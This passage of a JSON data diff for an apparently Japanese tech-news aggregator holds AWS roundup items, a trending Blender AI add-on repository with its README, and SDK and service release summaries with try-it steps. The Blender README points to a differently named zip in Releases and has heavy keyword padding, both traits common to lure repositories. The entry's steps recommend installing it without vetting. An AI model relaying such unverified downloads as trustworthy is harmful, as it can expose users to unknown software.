クレームで仲介者を識別することもできます。ユーザーに代わってバックエンドを呼び出すエージェントの場合は、元のトークンを転送しなくても委任をより明示的に行えるようになります。この機能は、すべての Cognito リージョンの Essentials プランと Plus プランで利用できます。\n \n AWS で Claude Fable 5.2 の提供を開始 – このモデルは、 Amazon Bedrock または Claude Platform on AWS からアクセスできます。Anthropic では、このモデルを、長期的なエンジニアリングタスク、科学研究、数量ファイナンスなどの技術的な作業において最も優れた能力を発揮する一般提供モデルとして位置付けています。Bedrock には モデル固有の保持要件 があり、Fable 5.2 トラフィックは不正使用検出のために最大 30 日間保持されます。対象となる内部使用については一時的なゼロ保持例外を使用できます。\n \n Amazon ElastiCache Serverless が検索と集計を追加 – Amazon ElastiCache Serverless for Valkey で、ベクトル検索、フルテキスト検索、およびハイブリッド検索をサーバー側の集計と組み合わせることが可能になりました。この組み合わせにより、頻繁に変化するデータをクエリするための新たなオプションがプロダクト検出、レコメンデーション、エージェントメモリ検索に提供されます。この機能には Valkey 9 が必要になるため、互換性のあるキャッシュを作成するか、既存のキャッシュをアップグレードしてください。商用リージョン、AWS GovCloud (米国)、および AWS European Sovereign Cloud で利用できます。\n \n Amazon OpenSearch Service がマネージド型のクロスリージョンディザスタリカバリを追加 – 1 つのアカウント内の 2 つのリージョンでバージョン 3.7 以降を実行している Amazon OpenSearch Service ドメインをペアリングできるようになりました。AWS は、データ損失については 1 分未満、復旧時間については 20 分未満を復旧目標として指定しています。計画的なスイッチオーバーではすべての書き込みが保持されますが、計画外のフェイルオーバーではレプリケートされていないデータが失われる可能性があります。ロール切り替え後の設定の整合性維持とアプリケーション書き込みのリダイレクトといった残りの作業、およびセカンダリドメインとデータ転送の料金は、 ディープダイブ に記載されています。\n \n Amazon CloudWatch Logs がアカウントレベルの保持ポリシーを追加 – Amazon CloudWatch では、既存のグループを対象とするポリシー、または新しいグループのみを対象とするポリシーを使用して、すべてのロググループまたは名前のプレフィックスが一致するグループに保持期間を設定できるようになりました。ポリシーが重複する場合は、最も長い保持期間が適用されます。プラットフォームチームは、各グループを個別に更新しなくても、ベースラインを設定し、セキュリティログをより長期間保持できます。この機能に追加料金はなく、中東 (バーレーン) と中東 (UAE) 以外の商用リージョンで利用できます。\n \n AgentCore の次世代ランタイムがデフォルト化 – Amazon Bedrock AgentCore の新しいランタイムが次世代ランタイムをデフォルトで使用するようになりました。そのため、エージェントセッションは 2 秒未満で開始され、8 vCPU および 32GB にスケールアップし、アイドル時にはゼロにスケールダウンして、請求対象のメモリも最大 68% 削減されます。各セッションは引き続き分離された独自の microVM で実行されます。\n \n AWS のお知らせに関する完全なリストについては、「 AWS の最新情報 」ページをご覧ください。\n \n AWS のその他のニュース \n 皆さんが興味を持つと思われるその他の記事とリソースをいくつかご紹介します。\n \n Amazon Bedrock でのタスクあたりのコストの最適化とエージェント ROI の証明 – このガイドでは、反復的な呼び出し、推論、キャッシュ、および人間によるレビューによるエージェントのコストを追跡します。私が気に入っているのは、完了したタスクの測定と、文書化されたベースラインとの結果の比較に重点を置いている点です。計算された料金はあくまで目安です。実際のワークロードを使用して、見積もりコストと請求データを照合してください。\n \n Zillow が AWS Step Functions で毎日 1 億件の通知を実行する方法 – Zillow は、1 日あたり 1 億件を超える通知のために、再利用可能なコンテンツモジュールと、設定主導型の AWS Step Functions Express ワークフローを活用していると説明しています。エンジニアリングに役立つ詳細情報には、べき等性を備えたモジュール、バッチ処理、キャンペーンの分離、および TestState API を使用したデプロイ前の式のテストが含まれます。これらのパターンは、通知システム以外にも幅広く適用できます。\n \n 今後開催される AWS イベント \n カレンダーを確認して、近日開催予定の AWS イベントにサインアップしましょう。\n \n AWS re:Invent – ラスベガスで 11 月 30 日から 12 月 4 日の期間に開催されるコミュニティイベントにご参加ください。ワークショップやディープダイブを含む 2,200 を超えるセッションを閲覧しましょう。無料のライブストリームに登録して基調講演や厳選されたセッションをリモートでフォローすることも可能です。\n \n AWS Community Day – お近くの地域で開催されるコミュニティ主導のテクニカルトーク、ワークショップ、ハンズオンラーニングを見つけましょう。最新の日付と登録の詳細については、各主催者のページをご覧ください。\n \n AWS Builder Center に参加して、ビルダーとつながり、ソリューションを共有し、開発をサポートするコンテンツにアクセスしましょう。 こちら から、今後開催されるすべての AWS 主導の対面イベントおよび仮想イベントとデベロッパー向けのイベントをご覧いただけます。\n \n 11 月 16 日週のニュースは以上です。11 月 23 日週に再びアクセスして、新たな Weekly Roundup をぜひお読みください!\n \n – Daniel Abib\n \n この記事は、Weekly Roundup シリーズの一部です。AWS からの興味深いニュースや発表を簡単にまとめて毎週ご紹介します! \n \n 原文は こちら です。",
+      "metrics": {
+        "hatena": 1
+      },
+      "sourceWeight": 3,
+      "id": "29ef3504172536d3",
+      "lang": "ja",
+      "foundIn": [
+        "rss"
+      ],
+      "preScore": 0.925,
+      "popularityPercentile": 0.36363636363636365,
+      "matchedTopics": [
+        "クラウド / 本番環境構築"
+      ],
+      "buzz": false,
+      "score": 90,
+      "titleJa": null,
+      "oneLiner": "AWSはクラウド資源を使わずにAWS APIを試せるAWS Emulatorなどを発表した。",
+      "takeaways": [
+        "AWS EmulatorでAWSの動作を手元で試せるようになった。",
+        "同じ処理を何度も試して結果を比べられる。",
+        "開発のたびにクラウド資源を作る必要がなくなった。"
+      ],
+      "keywords": [
+        "AWS Emulator",
+        "AWS Nitro Sandboxes",
+        "AWS API",
+        "Amazon Bedrock",
+        "Amazon CloudWatch",
+        "リージョン障害"
+      ],
+      "category": "リリース/アップデート",
+      "lane": "build",
+      "readingMinutes": 5,
+      "payoff": "apply",
+      "durability": "durable",
+      "rank": 1,
+      "deep": {
+        "summary": "AWS Emulator が一般提供され、AWS CLI や AWS SDK の接続先をローカルの HTTPS endpoint に切り替えて、AWS API インタラクションを自分のマシンで試せるようになりました。AWS アカウントや追加料金なしで、Amazon DynamoDB のテーブル作成、項目の書き込み、読み出しを繰り返せます。エージェントが呼び出し結果を調べ、コードを修正して再実行するループを、クラウドリソースのプロビジョニングなしで回せるのが主眼です。一方、IAM とリソースポリシー、クロスアカウント、クロスリージョンの動作は再現されず、未実装の操作は HTTP 501 を返します。ほかにも、EKS ポッドや ECS タスクを VM 境界で分離する AWS Nitro Sandboxes、Cognito の OAuth 2.0 トークン交換、OpenSearch Service のクロスリージョンディザスタリカバリなどが紹介されています。",
+        "prerequisites": [
+          {
+            "term": "AWS Emulator",
+            "stumblingPoint": "記事は「AWS Emulator の HTTPS エンドポイントを指定」と書くが、何を差し替えると既存コードを変えずに試せるか読み取りにくい。",
+            "explanation": "AWS Emulator は、AWS API の呼び出し先だけをローカルに向ける実行環境です。通常の AWS CLI や AWS SDK の操作コードはそのままに、接続先 endpoint を Emulator に変更します。そのため、実際の AWS リソースを作成する前に、エージェントのコードがどの API を呼び、どんな結果を受け取るかを手元で確認できます。"
+          },
+          {
+            "term": "HTTPS endpoint",
+            "stumblingPoint": "「Emulator の HTTPS endpoint を AWS CLI または AWS SDK に指定」とあるが、endpoint を変える意味が分からないと接続経路を想像できない。",
+            "explanation": "HTTPS endpoint は、CLI や SDK が API リクエストを送る宛先です。通常は AWS のリージョン別エンドポイントですが、ここだけを Emulator のローカル宛先に切り替えます。アプリケーションの DynamoDB 操作自体は変えず、通信の相手だけをローカル実装に置き換える、という意味です。"
+          },
+          {
+            "term": "HTTP 501",
+            "stumblingPoint": "記事は「未実装の呼び出しは HTTP 501」と説明するが、成功しない理由がコードの誤りかカバレッジ不足か判別しづらい。",
+            "explanation": "HTTP 501 は、リクエスト形式が間違っているのではなく、その操作を Emulator が実装していないことを示します。したがって、501 が返った場合はまず公開済みの忠実度結果で対応状況を確認します。対応外の API を使うテストだけ AWS 側へ切り替える判断材料になります。"
+          },
+          {
+            "term": "IAM",
+            "stumblingPoint": "記事は「IAM とリソースポリシーの適用を再現しない」と書くが、ローカルで成功しても本番の権限検証にはならない理由が省略されている。",
+            "explanation": "IAM は AWS リソースへの認証・認可を制御する仕組みです。Emulator では API の入出力を試せても、誰がどのリソースを操作できるかという AWS の権限評価は再現されません。ローカルで DynamoDB の読み書きが成功しても、最小権限や拒否条件が正しい証拠にはならないため、本番前に AWS で確認します。"
+          },
+          {
+            "term": "Nitro Sandboxes",
+            "stumblingPoint": "「ポッド、タスク、VM のハードウェア分離」とあるが、共有 EC2 上で何が分離されるのかが想像しにくい。",
+            "explanation": "Nitro Sandboxes は、共有 EC2 インスタンス上で動く EKS ポッドや ECS タスクに、個別の VM 境界を与える機能です。隣接ワークロードから隔離する分離モードと、ノードオペレーターからの保護・暗号学的な構成証明を加える機密モードがあります。テナント処理、ビルド、生成コードの実行を同じ基盤に載せる際の選択肢です。"
+          },
+          {
+            "term": "OAuth 2.0 トークン交換",
+            "stumblingPoint": "Cognito の「派生トークンに限定的な許可と単一のオーディエンス」とあるが、エージェントへの委任と元トークンの扱いが結び付かない。",
+            "explanation": "OAuth 2.0 トークン交換は、ユーザーのトークンを、その呼び出し先専用の別トークンへ交換する機能です。バックエンドやエージェントは元の広い権限のトークンを転送せず、対象サービス向けに絞ったトークンを使えます。アクタートークンを渡した場合は、act クレームで仲介者も識別できます。"
+          }
+        ],
+        "visual": null,
+        "figures": [
+          {
+            "url": "https://d2908q01vomqb2.cloudfront.net/da4b9237bacccdf19c0760cab7aec4a8359010b0/2026/11/13/aws-emulator-official-diagram_1540.png",
+            "alt": "ノートパソコンまたは CI 環境で AWS Emulator を呼び出すアプリケーションコード、SDK、CLI、コーディングエージェントと、AWS にデプロイするための別個のパスが示された AWS 公式ダイアグラム。",
+            "caption": "ローカルまたは CI ではアプリケーションと SDK／CLI が AWS Emulator に接続し、本番用の AWS へのデプロイ経路とは分離されている。"
+          }
+        ],
+        "code": null,
+        "relatedLinks": [],
+        "readingMinutes": 4,
+        "lane": "build",
+        "unlocks": [
+          "DynamoDBの作成・書込・読出をAWSアカウントなしで試せる",
+          "エージェントの修正と再実行をクラウド資源なしで繰り返せる"
+        ],
+        "howToTry": [
+          "https://aws.amazon.com/jp/blogs/news/aws-weekly-roundup-aws-nitro-sandboxes-aws-emulator-and-more-november-16-2026/",
+          "記事内の「AWS Emulator を使用してローカルで AWS に対してアプリケーションをテストする」使用開始ガイドを開く。",
+          "Linux パッケージ、または macOS／Windows 向け Docker の手順を選ぶ。",
+          "ガイドの手順どおりに AWS Emulator を起動し、表示された HTTPS endpoint を確認する。",
+          "ガイドのウォークスルーで AWS CLI または AWS SDK の接続先を endpoint に変更する。",
+          "Amazon DynamoDB テーブルを作成し、項目を書き込んでから読み出し、レスポンスを確認する。"
+        ],
+        "fitFor": [
+          "AWS CLI／SDKでDynamoDB操作をローカル検証したいとき",
+          "Linux、macOS、またはWindowsでDockerを使えるとき",
+          "エージェントの試行と修正を無課金で反復したいとき"
+        ],
+        "notFor": [
+          "IAMやリソースポリシーの評価を検証するとき",
+          "クロスアカウントやクロスリージョンの挙動を確認するとき",
+          "使用するAPI操作が忠実度結果で未実装のとき"
+        ],
+        "caveats": [
+          "IAM・リソースポリシー等は再現されず、本番前にAWSで検証が必要"
+        ],
+        "tryPrompt": "# 試すこと\nAWS EmulatorでDynamoDBの作成・書き込み・読み出しをローカル実行する。\nhttps://aws.amazon.com/jp/blogs/news/aws-weekly-roundup-aws-nitro-sandboxes-aws-emulator-and-more-november-16-2026/\n# 手順\n1. 上記URLを開き、本文中の「AWS Emulator を使用してローカルで AWS に対してアプリケーションをテストする」使用開始ガイドを開く。（手動）\n2. Linux パッケージ、または macOS／Windows 向け Docker の手順を選ぶ。（手動）\n3. 使用開始ガイドに記載されたコマンドを実行して AWS Emulator を起動する。\n4. 起動時に表示された HTTPS endpoint を確認する。\n5. ガイドの設定方法で AWS CLI または AWS SDK の接続先をその endpoint に変更する。\n6. DynamoDBテーブルを作成し、項目を書き込んで読み出す。\n7. 返却結果を確認し、読み出し処理を1か所変更して再実行する。\n# 確認したいこと\n- AWSアカウントや追加料金なしで最初のDynamoDB操作まで到達できるか\n- 既存のAWS CLI／SDKコードを大きく変更せず実行できるか\n- 未対応操作を呼んだときHTTP 501で判別できるか\n# 前提・注意\n- Linux、またはmacOS／Windows上のDockerが必要。\n- 記事本文には導入コマンドと具体的なendpoint値が掲載されていないため、使用開始ガイドの手順を使う。\n- IAM、リソースポリシー、クロスアカウント、クロスリージョンはAWS上でも検証する。"
+      }
+    },
+    {
+      "source": "github_repo",
+      "sourceLabel": "GitHub 急上昇リポジトリ",
+      "title": "tiobeharxi1987/blender-ai-copilot-flow — A controlled AI workflow for Blender: every copilot edit is a supervised tool call—proposed, approved, executed in sequence, cancellable after the current step and undoable by name—inside a visual studio with a built-in MCP server. · blender-ai-copilot-flow · blender · blender 3d · blender addon · blender plugin · blender extension",
+      "url": "https://github.com/tiobeharxi1987/blender-ai-copilot-flow",
+      "publishedAt": "2026-11-12T19:38:53.000Z",
+      "author": "tiobeharxi1987",
+      "authorDetail": {
+        "name": "tiobeharxi1987",
+        "url": "https://github.com/tiobeharxi1987",
+        "avatarUrl": "https://github.com/tiobeharxi1987.png?size=120",
+        "bio": "A controlled AI workflow for Blender: every copilot edit is a supervised tool call—proposed, approved, executed in sequence, cancellable after the current step and undoable by name—inside a visual studio with a built-in MCP server. · blender-ai-copilot-flow · blender · blender 3d · blender addon · blender plugin · blender extension"
+      },
+      "tags": [
+        "3d-automation",
+        "3d-modeling",
+        "blender",
+        "blender-addon",
+        "blender-agents",
+        "blender-ai",
+        "blender-assistant",
+        "blender-automation"
+      ],
+      "snippet": "A controlled AI workflow for Blender: every copilot edit is a supervised tool call—proposed, approved, executed in sequence, cancellable after the current step and undoable by name—inside a visual studio with a built-in MCP server. · blender-ai-copilot-flow · blender · blender 3d · blender addon · blender plugin · blender extension",
+      "metrics": {
+        "stars": 513
+      },
+      "sourceWeight": 3,
+      "lang": "en",
+      "id": "f5f9836da630dfd0",
+      "foundIn": [
+        "github_repo"
+      ],
+      "preScore": 0.7994736842105264,
+      "popularityPercentile": 0.3157894736842105,
+      "matchedTopics": [
+        "AI支援開発・品質",
+        "AIエージェント構築"
+      ],
+      "buzz": false,
+      "score": 89,
+      "titleJa": "blender-ai-copilot-flow — Blender編集を承認制で進めるAIワークフロー",
+      "oneLiner": "blender-ai-copilot-flowはBlenderの編集を承認と取り消し付きで進めるAI作業環境を提供する。",
+      "takeaways": [
+        "AIが行うBlender編集を一件ずつ確認できる。",
+        "実行中の作業を止めて名前付きで元に戻せる。",
+        "画面上の作業環境に外部連携の仕組みを組み込んでいる。"
+      ],
+      "keywords": [
+        "blender-ai-copilot-flow",
+        "Blender",
+        "MCP",
+        "AI copilot",
+        "tool call",
+        "undo"
+      ],
+      "category": "AI/エージェント",
+      "lane": "build",
+      "readingMinutes": 3,
+      "payoff": "decide",
+      "durability": "ephemeral",
+      "body": "blender-ai-copilot-flow\n\nA controlled AI workflow for Blender: every copilot edit is a supervised tool call—proposed, approved, executed in sequence, cancellable after the current step and undoable by name—inside a visual studio with a built-in MCP server.\n\n[download-url]: https://github.com/tiobeharxi1987/blender-ai-copilot-flow/releases\n\n[ ] \n\n[Download][download-url]\n\nNothing lands unseen: every edit is proposed, approved, run in order, and reversible by name.\n\nWhy\n\nThe scary part of AI in a production scene is not what it builds—it is what it might change while you blink. blender-ai-copilot-flow makes every copilot action a visible step in a controlled flow: proposed before execution, approved by you, applied in sequence with earlier steps finished first, cancellable after the current operation, and undoable through named undo steps. Tool calls are validated against the allowed set before they run. You get the speed of an AI copilot with the audit trail of a pipeline.\n\nWithout / With\n\n| Without | With |\n|---|---|\n| Fear of a wrecked scene | Nothing runs without your approval |\n| Mystery diffs you discover later | Each operation named and proposed before it executes |\n| Parallel edits colliding mid-brief | Sequential execution—one ordered flow |\n| No way back after a bad run | Named undo steps for every mutation |\n| Runaway multi-step plans | Cancel halts the workflow after the current step |\n| \"Is this call even allowed?\" | Python tool validation catches disallowed operations |\n\nQuick Start\n\nEvery command below is self-contained: open PowerShell, copy it, paste it, press Enter.\n\n1. Download mcp-for-blender-pro.zip from Releases.\n2. In Blender, open Edit → Preferences → Get Extensions → menu → Install from Disk.\n3. Select the ZIP, enable mcp-for-blender-pro, then open 3D Viewport → N → MCP Pro.\n4. Choose a provider, add your connection details and select a model.\n5. Send a message in Blender or click Open Studio Window.\n\nFeatures\n・Approve every operation—each tool call is proposed before it runs.\n・Cancel safely—Stop halts the workflow after the current step, mid-plan.\n・Undo by name—mutations leave named undo steps you can pick from Blender's own controls.\n・Run edits in sequence—ordered steps, no collisions between operations.\n・Validate tool calls—disallowed operations are caught before execution.\n・Watch each step—viewport snapshots confirm what actually changed.\n・Serve the flow to MCP clients—external calls meet the same supervised pipeline.\n\nHow it works\n\nblender-ai-copilot-flow runs inside Blender as an extension: the copilot inspects your scene through 27 supervised tools, proposes each brief as a sequence of named operations, and executes them in order with your approval, a safe cancel and named undo per mutation. Python tool validation checks each call against the allowed set before it runs—it catches disallowed operations, though it is not a security sandbox—and the same supervised flow is exposed to external clients through a local authenticated endpoint (http://127.0.0.1:9876/mcp).\n\nUsage\n\nA careful production pass. \"Add the three lights and the camera, one step at a time—show me each before the next.\" Approve, watch, continue; cancel anywhere after the current step.\n\nA reversible experiment. Let the copilot rearrange a whole section; every mutation leaves a named undo step, so one pick takes the scene back to the mark you named.\n\nSupervised scripting. When a brief needs executecode, the snippet is proposed, validated and approved like any other step—no silent scripts.\n\nConfiguration\n\n| Setting | Default | What it does |\n|---|---|---|\n| Approvals | Per operation | Every tool call is proposed before execution |\n| Cancellation | After current step | Stop finishes the running operation and halts the plan |\n| Named undo | Every mutation | Each edit leaves a named undo step |\n| Execution order | Sequential | Steps run one after another so edits stay ordered |\n| Tool validation | Enabled | Disallowed operations are caught before they run |\n| Workflow mode | Single assistant | Plain chat or a Team chain with the same controls |\n| Provider | OpenAI | OpenAI, Anthropic Claude, Google Gemini, OpenRouter, OpenCode Zen, Ollama or Custom API |\n| MCP endpoint | http://127.0.0.1:9876/mcp | Local Streamable HTTP endpoint for external MCP clients |\n| Interface language | English | English, German, French, Spanish or Chinese |\n| Asset services | Optional keys | Service keys for asset providers that require them |\n\nTroubleshooting / FAQ\n\nThe copilot stopped mid-brief. Stop ends after the current step by design—approve the next step to continue, or check the last proposal for a question it asked.\n\nHow is this different from Blender's undo? Named undo steps are created per copilot mutation, so you can jump back to a specific named point instead of counting Ctrl+Z presses.\n\nCan I skip approvals for trusted steps? Approvals are the core of the flow—but quick, low-risk edits can be approved in rapid succession.\n\nIs validation a security sandbox? No—it catches disallowed operations before they run; treat it as a seatbelt, not a firewall.\n\nDo external MCP clients follow the same rules? They manage their own approval policies; Blender-side visibility and undo still apply to every call.\n\nContributing\n\nFound a step that should be gated differently? Open an issue with the brief and the operation in question, or send a pull request. If blender-ai-copilot-flow keeps your scenes safe, a star helps others find it.\n\nKeywords\n\nblender-ai-copilot-flow · blender · blender 3d · blender addon · blender plugin · blender extension · blender scripting · blender automation · blender mcp · blender ai · blender assistant · blender copilot · blender chatgpt · blender llm · blender agents · bpy · 3d modeling · 3d automation · mcp · mcp server · model context protocol · ai for blender · operation approvals · named undo · undo steps · cancellation · safe cancel · sequential execution · ordered steps · tool validation · supervised tools · scene tools · scene inspection · scene generation · ai modeling · ai materials · viewport screenshot · studio workspace · task board · agent teams · multi agent · product visualization · geometry nodes · 3d workflow · 3d rendering · windows 3d · ai 3d · ollama · openai · anthropic claude · google gemini · openrouter · opencode zen · model catalog · connection profiles · custom api\n\nLicense\n\nReleased under the MIT license.",
+      "rank": 2,
+      "deep": {
+        "summary": "blender-ai-copilot-flowは、Blender内のAI編集を、実行前に確認できる操作単位へ分解する拡張機能です。AIはシーンを27個の監督付きツールで調べ、名前付き操作として提案し、承認された順にsequential executionします。各変更にはnamed undoが残り、停止しても実行中の操作が終わった後でフローを止められます。Pythonのtool validationは許可されていない操作を実行前に検出しますが、セキュリティサンドボックスではありません。外部クライアントからは、ローカルのMCP endpointを通じて同じ監督付きフローを利用できます。",
+        "prerequisites": [
+          {
+            "term": "blender-ai-copilot-flow",
+            "stumblingPoint": "記事は「Blender as an extension」と書いているが、通常のアドオンと同じ導入方法か読み取りにくい。",
+            "explanation": "blender-ai-copilot-flowはBlenderの拡張機能としてZIPからインストールするものです。BlenderのPreferencesからInstall from Diskを使うため、Pythonパッケージのように端末へpip installするものではありません。"
+          },
+          {
+            "term": "supervised tools",
+            "stumblingPoint": "「27 supervised toolsでシーンを調べる」とあるが、AIが直接Blenderを操作する仕組みとの違いが分かりにくい。",
+            "explanation": "supervised toolsは、AIの指示をそのまま実行するのではなく、操作を提案・承認・実行の単位に分ける窓口です。読者は各編集をBlenderの画面で確認してから進められます。"
+          },
+          {
+            "term": "sequential execution",
+            "stumblingPoint": "「executed in sequence」とあるが、通常のAIエージェントの複数操作と何が違うのか手が止まる。",
+            "explanation": "sequential executionでは、前の操作が終わるまで次の操作を開始しません。複数の編集が同時にシーンへ入り、順序が崩れることを避けるための実行方式です。"
+          },
+          {
+            "term": "named undo",
+            "stumblingPoint": "「undoable by name」とあるが、Blender標準のCtrl+Zとどう使い分けるかが省略されている。",
+            "explanation": "named undoは、AIによる各変更に名前付きの戻り先を作る仕組みです。何回戻るかを数えるのではなく、指定した操作の時点へ戻れる点がこの記事での違いです。"
+          },
+          {
+            "term": "tool validation",
+            "stumblingPoint": "「Python tool validation catches disallowed operations」とあるが、安全に任意コードを実行できる機能ではない。",
+            "explanation": "tool validationは、実行前に許可されたツール集合と照合して不許可の操作を止める検査です。記事自身がsecurity sandboxではないと明記しているため、悪意あるコードからBlenderを隔離する機能とは扱えません。"
+          },
+          {
+            "term": "MCP endpoint",
+            "stumblingPoint": "外部クライアント向けの「http://127.0.0.1:9876/mcp」が何に接続するURLか分かりにくい。",
+            "explanation": "MCP endpointは、同じPC上でBlender拡張機能が待ち受けるローカルのStreamable HTTP接続先です。外部MCPクライアントから呼び出せますが、クライアント側の承認ポリシーは別管理です。"
+          }
+        ],
+        "visual": {
+          "type": "flow",
+          "title": "編集の監督フロー",
+          "steps": [
+            {
+              "label": "シーン調査",
+              "detail": "copilotが27個のツールで確認"
+            },
+            {
+              "label": "操作提案",
+              "detail": "名前付きの編集手順を表示"
+            },
+            {
+              "label": "承認",
+              "detail": "ユーザーが各操作を許可"
+            },
+            {
+              "label": "順次実行",
+              "detail": "前の操作後に次を実行"
+            },
+            {
+              "label": "停止・復元",
+              "detail": "停止または名前付きundo"
+            }
+          ]
+        },
+        "figures": [],
+        "code": null,
+        "relatedLinks": [
+          {
+            "label": "Releases",
+            "url": "https://github.com/tiobeharxi1987/blender-ai-copilot-flow/releases"
+          }
+        ],
+        "readingMinutes": 3,
+        "lane": "build",
+        "unlocks": [
+          "AIのBlender編集を1操作ずつ承認して進められる",
+          "失敗した編集を名前付きの戻り先へ戻せる"
+        ],
+        "howToTry": [
+          "https://github.com/tiobeharxi1987/blender-ai-copilot-flow/releases",
+          "Releasesからmcp-for-blender-pro.zipをダウンロードする。",
+          "BlenderでEdit → Preferences → Get Extensions → メニュー → Install from Diskを開き、ZIPを選択する。",
+          "mcp-for-blender-proを有効化し、3D Viewport → N → MCP Proを開く。",
+          "Provider、接続情報、Modelを設定し、Blender内でメッセージを送信するかOpen Studio Windowをクリックする。"
+        ],
+        "fitFor": [
+          "Blenderのシーン編集をAIに任せつつ、各操作を確認したいとき",
+          "複数編集を順番に実行し、途中で停止したいとき",
+          "AI編集ごとに名前付きの復元ポイントが必要なとき"
+        ],
+        "notFor": [
+          "AI操作を無承認で完全自動実行したいとき",
+          "Pythonコードをセキュリティサンドボックス内で実行したいとき",
+          "Blender以外の制作ツールを操作したいとき"
+        ],
+        "caveats": [
+          "tool validationはセキュリティサンドボックスではない"
+        ],
+        "tryPrompt": "# 試すこと\nBlenderに拡張機能を導入し、AIにライト3個とカメラを1操作ずつ提案させ、承認・停止・undoを確認する。\nhttps://github.com/tiobeharxi1987/blender-ai-copilot-flow\n# 手順\n1. Releasesページを開く。（手動）\n2. mcp-for-blender-pro.zipをダウンロードする。（手動）\n3. BlenderでEdit → Preferences → Get Extensionsを開く。（手動）\n4. メニューからInstall from Diskを選び、ダウンロードしたZIPを指定する。（手動）\n5. mcp-for-blender-proを有効化する。（手動）\n6. 3D Viewport → N → MCP Proを開く。（手動）\n7. Provider、接続情報、Modelを設定する。（手動）\n8. 「Add three lights and a camera, one step at a time—show me each before the next.」を送信する。（手動）\n9. 各提案を確認して承認し、途中でStopを押す。（手動）\n10. 実行済みの名前付きundo stepから、指定した時点へ戻す。（手動）\n# 確認したいこと\n- 最初の操作が実行前に提案として表示されるか\n- Stop後に実行中の操作だけ完了し、次の操作が止まるか\n- Blenderのundo操作から名前付きの復元先を選べるか\n# 前提・注意\n- Blenderと、選択したProviderの接続情報が必要。\n- tool validationはサンドボックスではない。"
+      }
+    }
+  ],
+  "releases": [
+    {
+      "id": "76dfeedb1315531a",
+      "product": "Anthropic SDK for TypeScript",
+      "what": "Anthropic APIのTypeScript SDK",
+      "version": "v1.11.0",
+      "kind": "minor",
+      "impact": "unlocks",
+      "unlock": "Admin APIでClaude Code managed settingsを管理できるようになる",
+      "change": null,
+      "scope": [],
+      "summary": "Anthropic SDK for TypeScript v1.11.0で、Admin APIにClaude Code managed settingsとsandboxegressrestrictedエラーを追加。大規模イベントのストリーミングも高速化した。",
+      "title": "anthropics/anthropic-sdk-typescript sdk-v1.11.0",
+      "url": "https://github.com/anthropics/anthropic-sdk-typescript/releases/tag/sdk-v1.11.0",
+      "sourceLabel": "GitHub Releases / anthropics/anthropic-sdk-typescript",
+      "publishedAt": "2026-11-19T19:23:16.000Z",
+      "alsoReleased": [],
+      "tryPrompt": "# 試すこと\nAnthropic SDK for TypeScript v1.11.0 を入れて、「Admin APIでClaude Code managed settingsを管理できるようになる」を確かめる\nhttps://github.com/anthropics/anthropic-sdk-typescript/releases/tag/sdk-v1.11.0\n\n# 手順\n1. git clone --depth 1 --branch sdk-v1.11.0 https://github.com/anthropics/anthropic-sdk-typescript\n2. cd anthropic-sdk-typescript && ls\n3. README の手順どおりに依存を入れ、最初の出力が出るまで進める\n\n# 確認したいこと\n- v1.11.0 が実際に入って動くか\n- 「Admin APIでClaude Code managed settingsを管」を実際に確かめられるか\n- 既存の使い方のまま上げたときに壊れる箇所はあるか\n\n# 前提・注意\n- git が入っていること\n- sdk-v1.11.0 のタグを固定して clone している。main が要るなら --branch を外す"
+    },
+    {
+      "id": "fe9a475613965e04",
+      "product": "GitHub Enterprise Cloud",
+      "what": "企業向けGitHub開発基盤",
+      "version": null,
+      "kind": "service",
+      "impact": "unlocks",
+      "unlock": "Azure DevOpsから稼働を継続したまま移行できるようになる",
+      "change": {
+        "before": "Azure DevOpsからの移行を手動で計画・管理",
+        "after": "稼働中に検証・追跡し計画的にカットオーバー"
+      },
+      "scope": [
+        "GitHub Enterprise Cloud (data residency)"
+      ],
+      "summary": "Azure DevOps ServicesからGitHub Enterprise CloudへのEnterprise Live MigrationsがGA。ポータルまたはCLIで事前検証、移行状況の追跡、計画的な切り替えを行える。",
+      "title": "Enterprise Live Migrations from Azure DevOps generally available",
+      "url": "https://github.blog/changelog/2026-11-19-enterprise-live-migrations-from-azure-devops-generally-available",
+      "sourceLabel": "GitHub Changelog",
+      "publishedAt": "2026-11-19T18:50:57.000Z",
+      "alsoReleased": [
+        {
+          "label": "S3 audit log streaming with OpenID Connect expands to GHE.com",
+          "url": "https://github.blog/changelog/2026-11-19-s3-audit-log-streaming-with-openid-connect-expands-to-ghe-com"
+        }
+      ],
+      "tryPrompt": null
+    },
+    {
+      "id": "68d9ffec0ff16d92",
+      "product": "GitHub Actions",
+      "what": "GitHubのCI/CD自動化サービス",
+      "version": null,
+      "kind": "service",
+      "impact": "unlocks",
+      "unlock": "RHEL環境でGitHub-hosted larger runnersを本番利用できるようになる",
+      "change": {
+        "before": "RHEL runnerイメージはパブリックプレビュー",
+        "after": "RHEL 9／10 runnerイメージを本番利用"
+      },
+      "scope": [
+        "RHEL 9",
+        "RHEL 10"
+      ],
+      "summary": "GitHub ActionsのGitHub-hosted larger runnersでRHEL 9・RHEL 10イメージがGA。デプロイ先と同じOSで本番ワークフローを実行できる。",
+      "title": "Red Hat Enterprise Linux runner images now generally available",
+      "url": "https://github.blog/changelog/2026-11-19-red-hat-enterprise-linux-runner-images-now-generally-available",
+      "sourceLabel": "GitHub Changelog",
+      "publishedAt": "2026-11-19T18:48:46.000Z",
+      "alsoReleased": [],
+      "tryPrompt": null
+    },
+    {
+      "id": "1fd0a9c4b0e10ecd",
+      "product": "Gemini API",
+      "what": "Googleの生成AIモデルAPI",
+      "version": null,
+      "kind": "service",
+      "impact": "unlocks",
+      "unlock": "数百のツールを少ないトークンでエージェントから利用できるようになる",
+      "change": {
+        "before": "多数のツール定義でコンテキストを大量消費",
+        "after": "Tool Retrievalで必要なツールだけ取得"
+      },
+      "scope": [
+        "Gemini API"
+      ],
+      "summary": "Gemini APIにTool Retrievalをプレビューで追加。エージェントが数百のツールへアクセスしつつ、ツール定義に使うトークンを削減できる。",
+      "title": "Introducing Tool Retrieval in the Gemini API",
+      "url": "https://blog.google/innovation-and-ai/technology/developers-tools/gemini-api-tool-retrieval/",
+      "sourceLabel": "Google Developers",
+      "publishedAt": "2026-11-19T18:00:00.000Z",
+      "alsoReleased": [],
+      "tryPrompt": null
+    },
+    {
+      "id": "fd7f64b8c8169f77",
+      "product": "Google Cloud object enrichments",
+      "what": "オブジェクトストレージの非構造化データ変換機能",
+      "version": null,
+      "kind": "service",
+      "impact": "unlocks",
+      "unlock": "オブジェクトストレージのデータをエージェント向け文脈に変換できるようになる",
+      "change": {
+        "before": "エージェントがオブジェクトをバイト列として扱う",
